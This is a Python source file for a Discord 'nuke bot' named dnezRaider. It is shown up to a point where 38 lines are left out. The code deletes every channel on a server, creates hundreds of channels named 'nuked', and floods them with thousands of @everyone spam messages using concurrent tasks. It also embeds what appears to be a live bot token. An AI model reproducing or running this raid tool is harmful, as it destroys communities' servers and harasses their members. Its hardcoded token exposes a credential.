# dnezRaider - Custom nuke bot

import asyncio
import discord
from discord.ext import commands
import random
import time

# --- CONFIGURE THESE ---
BOT_TOKEN = "MTUwODQwNzI0MjQ2MDg4OTI1OQ.GbJk2j.phCez3c-p2Vd5TITHgTlYwDnLxg1mWX9z9cjzQ"
PREFIX = "."

# Nuke Configuration
CHANNEL_NAME = "nuked by dov"
MESSAGE = "@everyone @here nuked by dov"
AMOUNT_OF_CHANNELS = 500
AMOUNT_OF_MESSAGES = 10000

# Random channel name variations (optional - set to None to use CHANNEL_NAME)
RANDOM_CHANNEL_NAMES = [
    "𝕟𝕦𝕜𝕖𝕕",
    "𝔫𝔲𝔨𝔢𝔡",
    "𝚗𝚞𝚔𝚎𝚍",
    "ɴᴜᴋᴇᴅ",
    "𝓷𝓾𝓴𝓮𝓭",
    "nuked"
]

# Set to None to always use CHANNEL_NAME, or keep the list for random names
USE_RANDOM_NAMES = True  # Set to False to use CHANNEL_NAME only

# -----------------------
# DO NOT MODIFY BEYOND THIS POINT UNLESS YOU KNOW WHAT YOU'RE DOING!
# -----------------------

def get_channel_name():
    """Get channel name (random or fixed)"""
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def send_messages_fast(channels, message, total):
    """Send messages with rate limiting using semaphore"""
    if not channels:
        return
    
    semaphore = asyncio.Semaphore(50)
    
    async def send_with_limit(channel, msg):
        async with semaphore:
            try:
                await channel.send(msg)
            except Exception:
                pass
    
    tasks = []
    for i in range(total):
        channel = channels[i % len(channels)]
        tasks.append(send_with_limit(channel, message))
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_server(guild: discord.Guild):
    """Main nuke logic - deletes all channels, creates new ones, and spams messages"""
    print(f"Starting nuke on {guild.name} ({guild.id})")
    start_time = time.perf_counter()

    # Step 1: Delete all channels
    print("Deleting all channels...")
    await asyncio.gather(
        *(channel.delete() for channel in guild.channels),
        return_exceptions=True
    )

    # Step 2: Create new channels
    print(f"Creating {AMOUNT_OF_CHANNELS} channels...")
    async def create_raid_channel():
        return await guild.create_text_channel(get_channel_name())
    
    channels = await asyncio.gather(
        *(create_raid_channel() for _ in range(AMOUNT_OF_CHANNELS)),
        return_exceptions=True
    )

    # Step 3: Send messages
    text_channels = [c for c in channels if isinstance(c, discord.TextChannel)]
    if text_channels:
        print(f"Sending {AMOUNT_OF_MESSAGES} messages...")
        await send_messages_fast(text_channels, MESSAGE, AMOUNT_OF_MESSAGES)

    elapsed = time.perf_counter() - start_time
    print(f"Nuke completed in {elapsed:.2f} seconds!")

... (38 lines left)
